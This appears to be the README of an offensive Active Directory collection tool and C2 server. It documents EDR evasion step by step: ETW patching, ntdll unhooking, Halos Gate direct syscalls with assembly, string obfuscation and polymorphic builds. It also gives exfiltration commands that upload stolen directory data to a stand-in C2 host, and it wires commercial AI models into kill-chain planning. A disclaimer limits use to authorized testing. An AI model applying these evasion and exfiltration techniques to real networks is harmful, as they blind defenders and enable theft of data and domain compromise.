# AD-Necromancer V2

> **"Humans forget. Directories do not."**

A self-contained, EDR-evasive Active Directory privilege archaeology engine.  
V2 **no longer requires SharpHound** — it collects directly from AD via **real ADWS (MC-NMF/NTLM) or LDAP**, encrypts the output with AES-256-GCM, and feeds it into the AI analysis engine.  
One binary. Zero dependencies. Now ships with **The Grimoire** — a full C2 receiver + interactive gothic UI.

---

## ⚡ What's New in V2

| Feature | V1 | V2 |
|---|---|---|
| Data collection | Requires pre-run SharpHound | **Live ADWS (MC-NMF/NTLM) → LDAP fallback** |
| ADWS protocol | ❌ Broken HTTP stub | **✅ Real MC-NMF TCP framing on port 9389** |
| Authentication | Basic Auth (rejected by Windows) | **NTLM Negotiate/Challenge/Authenticate** |
| EDR evasion | None | **ETW patch, DLL unhooking, Halos Gate syscalls, XOR obfuscation** |
| Output | Console only | **AES-256-GCM encrypted zip — key NEVER printed** |
| Key handling | Printed in plaintext to console | **Saved to `adn_key_YYYYMMDD_HHMMSS.key` (0400 perms)** |
| C2 receiver | ❌ None | **✅ The Grimoire — gothic HTTPS C2 UI** |
| BH format | Import JSONs manually | **Auto-generates BloodHound CE v6 JSON** |
| Binary hash | Static | **Polymorphic: different SHA256 on every build** |
| Privacy Cloak | ✅ | ✅ (preserved + used in Grimoire AI chat) |
| AI Analysis | ✅ | ✅ (`--analyze` + interactive What-If chatbox in Grimoire) |

---

## 🔥 V2 Architecture

```
┌───────────────────────────────────────────────────────────────────┐
│                        AD-Necromancer V2                          │
│                                                                   │
│  ┌─────────────────┐    ┌──────────────────────────────────────┐  │
│  │  EDR Evasion    │    │         Collection Engine            │  │
│  │   Bootstrap     │    │  ADWS-First (MC-NMF/NTLM, port 9389)│  │
│  │                 │    │       ↓ fallback on failure          │  │
│  │ • ETW patch     │    │  LDAP Ghosting (port 389/636)        │  │
│  │ • DLL unhook    │    │  Stealth jitter · 3-retry logic      │  │
│  │ • Halos Gate    │    └────────────────┬─────────────────────┘  │
│  │ • XOR strings   │                     │                        │
│  └─────────────────┘    ┌────────────────▼─────────────────────┐  │
│                         │          Output Pipeline             │  │
│                         │  BH CE v6 JSON → AES-256-GCM Zip    │  │
│                         │  Key → adn_key_YYYYMMDD_HHMMSS.key  │  │
│                         │  Payload → Local / HTTPS C2          │  │
│                         └────────────────┬─────────────────────┘  │
│                                          │                        │
│                         ┌────────────────▼─────────────────────┐  │
│                         │       AI Necromancy Engine           │  │
│                         │  --analyze · Privacy Cloak           │  │
│                         │  DeepSeek · Claude · Gemini · OpenAI│  │
│                         └──────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│                     The Grimoire (C2 Server)                      │
│                                                                   │
│  POST /upload ←── Agent --exfil ──────────────────────────────►  │
│  POST /api/offline-load ←── Manual zip+key upload                │
│  GET  /api/events ──► SSE push to all browsers                   │
│                                                                   │
│  ┌─────────────────────────┐  ┌──────────────────────────────┐   │
│  │  Cytoscape.js Graph     │  │   ☠ THE GRIMOIRE ☠           │   │
│  │  (BloodHound-compatible)│  │                              │   │
│  │  • Node types + colors  │  │  Privilege Archaeology       │   │
│  │  • ACE edge highlighting│  │  Findings (Claude AI)        │   │
│  │  • Neighborhood search  │  │                              │   │
│  │  • Click → What-If      │  │  Ask the Dead — What-If      │   │
│  │                    70%  │  │  Simulator chatbox     30%   │   │
│  └─────────────────────────┘  └──────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Agent — Live Collection

```powershell
# Auto mode: tries ADWS first, falls back to LDAP
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd

# Stealth mode (minimal output, jitter, EDR evasion max)
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --stealth

# Exfil to The Grimoire C2
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --exfil https://kali-ip:8443/upload

# Full stealth + AI analysis + exfil
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --stealth --exfil https://kali-ip:8443/upload --analyze --claude

# Offline mode — analyze existing BloodHound JSON directory
.\ad-necromancer.exe --data C:\path\to\jsons --analyze
```

### The Grimoire — C2 Server (run on Kali / Linux)

```bash
# Set your Anthropic key (Claude is the default AI backend for the Grimoire)
export ANTHROPIC_API_KEY="sk-ant-..."

# Start the C2 server (self-signed cert generated automatically)
go run ./cmd/grimoire/

# Or with explicit key and custom port
go run ./cmd/grimoire/ --api-key sk-ant-... --port 8443
```

Then open **`https://kali-ip:8443`** in a browser (accept the self-signed cert warning).

The Grimoire will:
1. Auto-load data the moment an agent POSTs to `/upload`
2. Build a Cytoscape.js graph of the AD environment
3. Tokenize all entity names in memory (Privacy Cloak)
4. Trigger an initial Claude AI privilege archaeology analysis
5. Enable the interactive What-If chatbox

### Polymorphic Build from Source

```powershell
# Requires Go 1.21+ and garble
git clone https://github.com/0xSense1/AD-Necromancer.git
cd AD-Necromancer

# Different SHA256 on every build
.\build.ps1
```

---

## 📋 Agent Flags

### Collection (Live Mode)

| Flag | Default | Description |
|---|---|---|
| `-u, --username` | — | AD username |
| `-d, --domain` | — | Domain FQDN (e.g. `corp.local`) |
| `-p, --password` | — | Password |
| `--dc` | auto | DC hostname/IP |
| `--method` | `auto` | `adws` \| `ldap` \| `auto` |

### Output

| Flag | Default | Description |
|---|---|---|
| `--local` | `true` | Save `adn_data.zip` locally |
| `--exfil` | — | HTTPS C2 URL for encrypted zip upload |

### Analysis (AI Engine)

| Flag | Default | Description |
|---|---|---|
| `--analyze` | `false` | Run AI privilege archaeology |
| `--data` | — | Offline: path to BloodHound JSON directory |
| `--claude` | — | Use Anthropic Claude |
| `--gemini` | — | Use Google Gemini |
| `--openai` | — | Use OpenAI |
| `--on-premise` | — | Use local Ollama |
| `--sample-size` | `20` | Max entities per type sent to AI |

### Evasion

| Flag | Default | Description |
|---|---|---|
| `--stealth` | `false` | Max evasion: jitter, minimal output, all ops silent |
| `--no-unhook` | `false` | Disable DLL unhooking (debug) |
| `--no-etw-patch` | `false` | Disable ETW patching (debug) |

### Privacy

| Flag | Default | Description |
|---|---|---|
| `--no-privacy-cloak` | `false` | Send real names to remote AI (not recommended) |
| `--save-mapping` | `false` | Save tokenization mapping to disk |
| `--debug` | `false` | Show AI payload to verify Privacy Cloak |

### Grimoire Server Flags

| Flag | Default | Description |
|---|---|---|
| `--port` | `8443` | HTTPS listen port |
| `--provider` | `claude` | Default AI provider if no `grimoire_ai.json` saved |
| `--api-key` | env / saved | API key (overrides `grimoire_ai.json` and env var for one-shot runs) |
| `--model` | provider default | Model name |

> **Tip:** After first launch, configure the AI backend directly from the browser UI — click the **⚙ AI BACKEND** badge in the header. Provider, model, and API key are saved to `grimoire_ai.json` (0600 perms, gitignored) and hot-swapped without restart.

---

## 🌐 ADWS Implementation — MC-NMF / NTLM

The old ADWS client used plain HTTP with Basic Auth — which Windows ADWS flatly rejects. V2 implements the full protocol stack:

```
TCP:9389
  └─► MC-NMF Preamble (VersionRequest → ModeRequest → ViaRequest → KnownEncoding → PreambleEnd)
        └─► NTLM Negotiate (Type1 → Type2 Challenge → Type3 Authenticate)
              └─► WS-Enumeration SOAP (Enumerate → paginated Pull until EndOfSequence)
                    └─► XML parse → bh.Node graph
```

**Status messages during collection:**
```
[*] ADWS-First: Connecting to port 9389...
[+] ADWS-First: Connected successfully
 — or —
[!] ADWS-First: Failed - falling back to LDAP Ghosting
```

**Collects:** Users, Groups, Computers, Domains, GPOs, OUs, Certificate Templates, Enterprise CAs, `nTSecurityDescriptor` ACLs, delegation attributes, `msDS-KeyCredentialLink`.

---

## 🛡️ EDR Evasion — Deep Technical Breakdown

AD-Necromancer implements **five independent evasion layers** that execute at process startup (via `evasion.Bootstrap()`) before any AD collection begins. Each layer targets a different point in the EDR detection chain.

### Detection Chain Overview

```
┌─────────────────────────────────────── EDR Detection Chain ────────────────────────────────────────┐
│                                                                                                     │
│  Static Analysis          │   Dynamic Analysis (Runtime)           │   Behavioural / Cloud          │
│  ─────────────────────    │   ──────────────────────────────────   │   ─────────────────────────    │
│  String scanning (YARA)   │   IAT hooks (GetProcAddress)           │   AMSI scanning                │
│  Import table analysis    │   Inline hooks in ntdll .text          │   ETW telemetry events         │
│  Hash-based blocklists    │   Syscall tracing / SSDT monitoring    │   Cloud ML: call sequences      │
│                                                                                                     │
│  Layer 1: XOR Obfuscation │   Layer 3: DLL Unhooking              │   Layer 4: ETW Patching        │
│  Layer 6: garble -lits    │   Layer 5: Halos Gate Syscalls        │                                │
│  Layer 2: PEB Walk (no    │   Layer 5: Direct SYSCALL asm stub    │                                │
│           GetModHandle)   │                                        │                                │
└─────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

### Execution Order

```
Process Start
    │
    ├─► Bootstrap() ─────────────────────────────────────────────────────────────────────────────────
    │       │
    │       ├─ [1] XOR strings deobfuscated at first use (Obf() calls)
    │       │        └─ No plaintext DLL/API names ever in binary's .rdata
    │       │
    │       ├─ [2] UnhookEDRs()  ──────────────────────────────────────────────────────────────────
    │       │        │
    │       │        ├─ WalkModules()          PEB GS:[0x60] → LDR_DATA_TABLE_ENTRY list
    │       │        │                         (no GetModuleHandle, no LoadLibrary)
    │       │        │
    │       │        ├─ FindModule("ntdll")    locate in-memory ntdll base address
    │       │        │
    │       │        ├─ ReadFile(System32\ntdll.dll)   read clean on-disk .text section
    │       │        │
    │       │        ├─ NtProtectVirtualMemory()  ◄── direct syscall (Halos Gate SSN)
    │       │        │     → PAGE_EXECUTE_READWRITE on in-memory .text
    │       │        │
    │       │        ├─ copy(memText, diskText)   overwrite hooked bytes with clean bytes
    │       │        │
    │       │        ├─ NtProtectVirtualMemory()  restore original page protection
    │       │        │
    │       │        └─ Repeat for: kernelbase.dll + any EDR DLL (csfalcon, sentinel, edr…)
    │       │
    │       └─ [3] PatchETW()  ───────────────────────────────────────────────────────────────────
    │                │
    │                ├─ resolveExport(ntdll, "EtwEventWrite")     export table walk (no GetProcAddress)
    │                ├─ resolveExport(ntdll, "EtwEventWriteFull")
    │                ├─ resolveExport(ntdll, "NtTraceEvent")
    │                │
    │                └─ patchFuncRET(va)
    │                       ├─ NtProtectVirtualMemory()  → PAGE_EXECUTE_READWRITE
    │                       ├─ *funcVA = 0xC3            write RET opcode → function is a no-op
    │                       └─ NtProtectVirtualMemory()  → restore
    │
    └─► Collection proceeds through clean ntdll with ETW silenced
```

---

### Layer 1 — XOR String Obfuscation (`evasion/strings.go`)

**What EDRs do:** Static YARA rules and AV string scanning look for known-bad plaintext strings in the binary's `.rdata` section — `EtwEventWrite`, `ntdll.dll`, `9389`, `SharpHound`, etc.

**What we do:** Every sensitive string is stored as a **pre-XOR'd byte literal** in source. The plaintext is never in the binary's string table. Strings are reconstructed at runtime only when `Obf()` is called.

```
Source:     SNtdll = []byte{0xC9, 0x4B, 0xF8, 0x3D, 0x84, 0x0A, 0xD2, 0x61, 0x36}
Runtime:    Obf(SNtdll) → "ntdll.dll"
```

**Key design:** The 16-byte XOR key is assembled at `init()` time from two separate unexported arrays (`obfKeyLo`, `obfKeyHi`) stored in different memory regions — no single contiguous key block appears in the binary. For production DEFCON builds, `garble -literals` handles this at **compiler level**, making all string constants unrecoverable without execution.

| Detection attempt | Result |
|---|---|
| `strings ./binary \| grep ntdll` | ❌ No match — only XOR'd bytes in `.rdata` |
| YARA rule on `EtwEventWrite` | ❌ No match |
| YARA rule on `9389` (ADWS port) | ❌ No match |
| Static disassembly + key recovery | ⚠ Possible with effort (mitigated by `garble -literals` on full builds) |

---

### Layer 2 — PEB Walk (`evasion/peb.go` + `peb_amd64.s`)

**What EDRs do:** Monitor calls to `GetModuleHandle`, `GetProcAddress`, `LoadLibrary` — the standard Win32 API for DLL/symbol resolution.

**What we do:** Walk the **Process Environment Block** directly via AMD64 thread-local storage:

```asm
; peb_amd64.s
MOVQ 0x60(GS), AX   ; GS:[0x60] = PEB* on Windows x64
```

From the PEB pointer we traverse `PEB_LDR_DATA → InLoadOrderModuleList → LDR_DATA_TABLE_ENTRY` to read every loaded DLL's base address and name — **zero Win32 calls**.

```
GS:[0x60]
    └─► PEB
         └─► PEB_LDR_DATA.InLoadOrderModuleList (circular doubly-linked list)
                  ├─► LDR_DATA_TABLE_ENTRY → ntdll.dll    (DllBase, SizeOfImage)
                  ├─► LDR_DATA_TABLE_ENTRY → kernel32.dll
                  └─► LDR_DATA_TABLE_ENTRY → [EDR DLL].dll
```

| Detection attempt | Result |
|---|---|
| Hook on `GetModuleHandle` | ❌ Never called |
| Hook on `LdrGetDllHandle` (ntdll) | ❌ Never called |
| SSDT monitoring of module enumeration APIs | ❌ Not triggered |

---

### Layer 3 — EDR DLL Unhooking (`evasion/unhook.go`)

**What EDRs do:** At process injection or DLL load time, EDRs overwrite the first bytes of sensitive Nt* functions in ntdll with a `JMP hook_dispatcher` instruction. Every call to `NtWriteFile`, `NtCreateProcess`, etc. is intercepted.

**What we do:**

```
In-Memory ntdll .text (HOOKED):        Clean on-disk ntdll .text:
  NtProtectVirtualMemory:                NtProtectVirtualMemory:
    E9 XX XX XX XX  ← JMP [EDR]    vs    4C 8B D1        mov r10, rcx
    ...                                  B8 50 00 00 00  mov eax, 0x50  ← SSN
                                         ...
```

1. **Read clean copy** from `C:\Windows\System32\ntdll.dll` (on-disk pre-hook image)
2. **Parse `.text` section** via manual PE header walk (no `ImageDirectoryEntryToData`)
3. **Make writable** via `NtProtectVirtualMemory` — called via **direct syscall** (see Layer 5), bypassing the very hooks we're about to remove
4. **`copy()`** clean bytes over the hooked in-memory `.text`
5. **Restore protection** via another direct syscall

Targets in order: `ntdll.dll` → `kernelbase.dll` → any loaded EDR DLL matching known name patterns.

| EDR | Detection DLL pattern |
|---|---|
| CrowdStrike Falcon | `csfalcon` |
| SentinelOne | `sentinel` |
| Generic EDR | `edr` |
| Microsoft Defender for Endpoint | `mde` |
| Carbon Black | `cbdll` |
| Elastic EDR | `elastic` |
| Cylance | `cylance` |

| Detection attempt | Result |
|---|---|
| Hook on `NtProtectVirtualMemory` (ntdll) | ❌ Bypassed via direct syscall before unhook |
| IAT monitoring | ❌ Not in IAT |
| Kernel minifilter on `ReadFile(ntdll.dll)` | ⚠ Kernel-level IRP visible — low-confidence telemetry |

---

### Layer 4 — ETW Patching (`evasion/etw.go`)

**What EDRs do:** Windows Event Tracing (ETW) providers in ntdll emit telemetry on process activity — syscall names, heap allocations, .NET runtime events — which cloud-connected EDRs ingest for ML-based detection.

**What we do:** Write a single `0xC3` (RET) byte to the first instruction of the three key ETW write functions. Any call to these functions now immediately returns without writing any event.

```
Before patch:     After patch:
EtwEventWrite:    EtwEventWrite:
  push rbp          C3  ← RET — function is a no-op
  mov rbp, rsp
  ...
```

Functions patched:
- `EtwEventWrite` — primary ETW write path
- `EtwEventWriteFull` — extended metadata variant
- `NtTraceEvent` — kernel ETW bridge

The patch itself uses `NtProtectVirtualMemory` via **direct syscall** (after unhooking) so the protection change isn't visible to ntdll hooks.

| Detection attempt | Result |
|---|---|
| ETW `Microsoft-Windows-Threat-Intelligence` session | ❌ Silenced |
| AMSI ETW provider events | ❌ Silenced |
| Kernel ETW (WPP, EtwTi) | ⚠ Kernel providers are unaffected — userland ETW only |

---

### Layer 5 — Halos Gate Direct Syscalls (`evasion/syscall.go` + `peb_amd64.s`)

**What EDRs do:** Hook Nt* stubs in ntdll with `JMP` patches. Every time your code calls `NtProtectVirtualMemory`, the EDR intercepts it in userland before the CPU ever executes `SYSCALL`.

**What we do — Hell's Gate + Halos Gate:**

**Step 1 — Find the SSN (Syscall Service Number):**
```
ntdll export table → NtProtectVirtualMemory VA
    │
    ├─ Byte at VA == 0x4C? (mov r10, rcx)  ← clean stub
    │       └─► Read SSN from bytes [VA+4..VA+7]  ─ Hell's Gate
    │
    └─ Byte at VA == 0xE9? (JMP) ← hooked! ─ Halos Gate fallback
            └─► Scan neighbouring stubs ±N × 32 bytes
                    ├─ Each unhooked neighbour has SSN = target_SSN ± offset
                    └─► Recover correct SSN arithmetically
```

**Step 2 — Execute SYSCALL directly (Plan 9 assembly):**
```asm
; peb_amd64.s — doSyscall()
MOVQ ssn,   AX       ; syscall number
MOVQ a1,    R10      ; arg1 (R10 not RCX — SYSCALL clobbers RCX)
MOVQ a2,    DX       ; arg2
MOVQ a3,    R8       ; arg3
MOVQ a4,    R9       ; arg4
MOVQ a5,    R11
MOVQ R11,   0x28(SP) ; arg5 → [rsp+0x28] (Windows kernel reads from stack)
MOVQ a6,    R12
MOVQ R12,   0x30(SP) ; arg6 → [rsp+0x30]
SYSCALL              ; CPU transitions to kernel — no ntdll involved
```

The CPU jumps directly from our code to the kernel via the `SYSCALL` instruction. The EDR's userland hook in ntdll is **never reached**.

```
Normal call path (hooked):          Our path (Halos Gate):
  our code                            our code
    │                                   │
    ▼                                   │  (skip)
  ntdll!NtProtectVirtualMemory          │
    │ E9 → JMP [EDR hook]               │
    ▼                                   ▼
  [EDR intercept]                    SYSCALL ──► Windows Kernel (NT layer)
    │
    ▼
  Windows Kernel (NT layer)
```

| Detection attempt | Result |
|---|---|
| Hook on `NtProtectVirtualMemory` in ntdll | ❌ Never called through ntdll |
| `GetProcAddress` for SSN resolution | ❌ Export table walked via PEB (Layer 2) |
| All ntdll Nt* hooks simultaneously hooked | ⚠ Halos Gate uses neighbour stubs — survives up to 10 consecutive hooks |

---

### Bootstrap Order — Why Sequence Matters

```
Bootstrap()
  Step 1: UnhookEDRs()
          └─ Uses direct syscall (Halos Gate) to call NtProtectVirtualMemory
             BEFORE unhooking — so the syscall bypasses the hook that's still in place.
             We don't need ntdll clean to do this step.

  Step 2: PatchETW()
          └─ Now running with clean ntdll. NtProtectVirtualMemory calls used for
             ETW patching go through the restored clean stub path.
             ETW events from our memory writes are suppressed before collection starts.

  Step 3: Collection begins
          └─ ntdll clean, ETW silent, syscalls direct.
```

### Production Build — `garble -literals`

For DEFCON / operational builds, compile with:

```bash
go install mvdan.cc/garble@latest

garble -seed=random -literals -tiny build \
  -ldflags "-s -w" \
  ./cmd/ad-necromancer/
```

| `garble` flag | Effect |
|---|---|
| `-seed=random` | Different symbol name mangling on every build (breaks hash blocklists) |
| `-literals` | Encrypts **all string constants** at compiler level — XOR approach becomes a second layer |
| `-tiny` | Strips debug info, type names, method names |
| `-ldflags -s -w` | Strip symbol table + DWARF debug info |

---

## 🔑 Encrypted Output & Key Handling

Every run produces `adn_data.zip` + `adn_key_YYYYMMDD_HHMMSS.key`:

```
  ╔══════════════════════════════════════════════════════════╗
  ║  🔐 ENCRYPTED DATA SAVED                                 ║
  ║                                                          ║
  ║  Payload  : adn_data.zip (AES-256-GCM)                  ║
  ║  Key file : adn_key_20260409_191822.key                  ║
  ║                                                          ║
  ║  ⚠  Keep this key safe.                                  ║
  ║     It will NOT be saved automatically anywhere else.    ║
  ╚══════════════════════════════════════════════════════════╝
```

- Key is written with **`0400` permissions** (owner read-only)
- Key hex is **never printed to the terminal**
- In `--stealth` mode: single silent line `[key]→adn_key_YYYYMMDD_HHMMSS.key`
- If `--exfil` is set: key is sent as `X-Session-Key` HTTP header to the C2, which decrypts and loads the data automatically

Import `adn_data.zip` directly into BloodHound CE — it accepts the zipped JSON format natively. Or load it into **The Grimoire** with the `.key` file for the interactive AI analysis experience.

---

## ☠ The Grimoire — C2 UI

The Grimoire is a standalone Go HTTPS server that serves an embedded gothic web UI.

### Ingestion modes

**Online (agent exfil):**
```bash
# Agent uploads automatically
.\ad-necromancer.exe ... --exfil https://kali-ip:8443/upload
# → Grimoire decrypts, parses, pushes graph to all connected browsers via SSE
```

**Offline (manual upload):**
- Click **⚡ OFFLINE UPLOAD** in the UI
- Select `adn_data.zip` and the `adn_key_*.key` file
- Grimoire decrypts server-side and loads the graph

### Graph features
- Node type colours: User (purple), Group (red), Computer (blue), Domain (gold), GPO (green), CertTemplate (crimson), EnterpriseCA (dark red)
- High-value/admincount nodes enlarged with bright border
- Disabled/stale nodes rendered as ghosts (dashed border, dimmed)
- Click a node → neighbourhood highlight + info card
- **"☠ What if I compromise this?"** button auto-fills chat with a kill chain question
- Edge labels for critical ACEs (`GenericAll`, `DCSync`, `WriteDACL`, etc.) in bright red
- Search box: type any name, token, or SAM — matching nodes highlighted + viewport fit

### AI Privacy Cloak (in-browser)
All real entity names are replaced with `ENTITY_NNN` tokens **before** any data leaves the browser for Claude:
- User types: `"What if I compromise DC1?"` → sent as `"What if I compromise ENTITY_042?"`
- Claude responds with tokens → browser detokenizes to real names before display
- Token mapping persists for the entire browser session
- Chat history keeps tokenized form (persistent context across turns)

### Automatic analysis
On data load, the Grimoire auto-sends a tokenized environment summary to Claude for initial privilege archaeology. Results appear in the **⚰ PRIVILEGE ARCHAEOLOGY FINDINGS** panel with `CRITICAL` / `HIGH` / `MEDIUM` severity markers.

---

## 🔒 Privacy Cloak

When using remote AI backends, Privacy Cloak tokenizes all sensitive AD identifiers before they leave your machine. The AI never sees real names.

```
"svc_backup_legacy@CORP.LOCAL"  →  "ENTITY_007"
"DOMAIN ADMINS@CORP.LOCAL"      →  "ENTITY_012"
"DC01.CORP.LOCAL"               →  "ENTITY_003"
```

| Scenario | Privacy Cloak |
|---|---|
| Remote AI (default) | ✅ ON |
| On-premise Ollama | ⚪ OFF |
| `--no-privacy-cloak` | ❌ Disabled |
| Grimoire chatbox | ✅ Always ON (JS in-browser) |

---

## ♻️ Polymorphic Build System

Every invocation of `build.ps1` produces a **different binary hash**:

```powershell
.\build.ps1
# SHA-256: F5BBA9CBB718604CFA427A1C6991478197600FB31F2B4F5238A5B5E518F059BA

.\build.ps1
# SHA-256: D3E7693F8BA0AA929F2E101A03F33E09C389A32474D183318DD36AA4B35B7DD4
```

| Layer | Technique | Effect |
|---|---|---|
| 1 | `garble -seed=random -literals -tiny` | Randomizes function names, symbol table, string encoding |
| 2 | `-ldflags -X phantom.BuildID=<UUID v4>` | Unique 36-char string embedded in binary per compile |
| 3 | `gen_phantom.go` regenerates `phantom.go` with 256 new random bytes | Mutates `.data` section |

Breaks hash-based EDR/AV blocklists that trigger before behavioral analysis.

---

## 🔧 AI Backend Setup

Set the appropriate environment variable before running:

```powershell
# DeepSeek (agent default)
$env:DEEPSEEK_API_KEY="your-key"

# Anthropic Claude (Grimoire default + agent --claude)
$env:ANTHROPIC_API_KEY="your-key"
# Optional: set model
$env:CLAUDE_MODEL="claude-opus-4-5"

# OpenAI
$env:OPENAI_API_KEY="your-key"

# Google Gemini
$env:GEMINI_API_KEY="your-key"

# Ollama (local — no key needed)
$env:OLLAMA_ENDPOINT="http://localhost:11434"
$env:OLLAMA_MODEL="llama3"
```

**Agent priority:** Ollama → Claude → Gemini → OpenAI → DeepSeek

---

## 📊 Sample AI Analysis Output

```
╔══════════════════════════════════════════════════════════════════════════════╗
║ ☠  CRITICAL — RBCD Residue on Decommissioned Test System                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

[ENTITY] ENTITY_042 (Computer)

[SECURITY INTERPRETATION]
  ▸ ENTITY_007 has AddAllowedToAct on ENTITY_042
  ▸ Enables RBCD — attacker can impersonate any user to any service on this host
  ▸ Forgotten config from decommissioned test project, last touched 892 days ago

[UNDEAD CONTROL PATH]
         🟣 ENTITY_007 (User)
                │ AddAllowedToAct
                ▼
         🔴 ENTITY_042 (Computer, RBCD)
                ▼
         🔴 Domain Compromise

[EXECUTION VECTORS]
  • Set SPN on controlled account → rbcd.py → impersonate DA
  • getST.py -spn cifs/ENTITY_042 → pass-the-ticket

[MITIGATION]
  Remove AddAllowedToAct from ENTITY_042.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 🗂️ Project Structure

```
ad-necromancer/
├── cmd/
│   ├── ad-necromancer/
│   │   └── main.go             ← Agent entry point
│   └── grimoire/
│       ├── main.go             ← The Grimoire C2 server
│       └── web/
│           └── index.html      ← Embedded gothic UI (Cytoscape.js)
├── build.ps1                   ← Polymorphic build script
├── internal/
│   ├── evasion/                ← EDR evasion layer
│   │   ├── strings.go          ← XOR obfuscated sensitive strings
│   │   ├── peb.go              ← PEB walker (no GetModuleHandle)
│   │   ├── peb_amd64.s         ← gs:[0x60] + direct SYSCALL stubs (Plan 9 asm)
│   │   ├── syscall.go          ← Halos Gate SSN extraction + NtProtectVirtualMemory
│   │   ├── unhook.go           ← EDR DLL unhooker
│   │   └── etw.go              ← ETW patcher + evasion Bootstrap()
│   ├── adws/
│   │   ├── client.go           ← MC-NMF TCP framing + NTLM + WS-Enumeration
│   │   └── base64.go           ← Base64 helpers for NTLM token encoding
│   ├── ldap/                   ← LDAP client + collector (LDAP Ghosting fallback)
│   ├── collector/collector.go  ← ADWS-First auto-select with LDAP fallback
│   ├── bh/                     ← BloodHound CE v6 formatter + types
│   ├── crypto/aes.go           ← AES-256-GCM zip encrypt/decrypt
│   ├── exfil/exfil.go          ← Local save + key file + HTTPS C2 upload
│   ├── phantom/                ← Polymorphic padding + BuildID injection
│   ├── necromancy/engine.go    ← AI analysis engine + ZombiePath output
│   ├── privacy/                ← Privacy Cloak tokenizer
│   └── prompts/prompts.go      ← Necromancer system prompt
```

---

## ⚠️ Legal Disclaimer

AD-Necromancer is an **offensive security research tool** intended exclusively for:
- Authorized penetration testing engagements
- Red team operations with written permission
- Security research in controlled lab environments
- Academic and conference demonstrations (e.g. DEFCON)

**Unauthorized use against systems you do not own or have explicit permission to test is illegal.** The authors assume no liability for misuse.

---

## 📝 License

MIT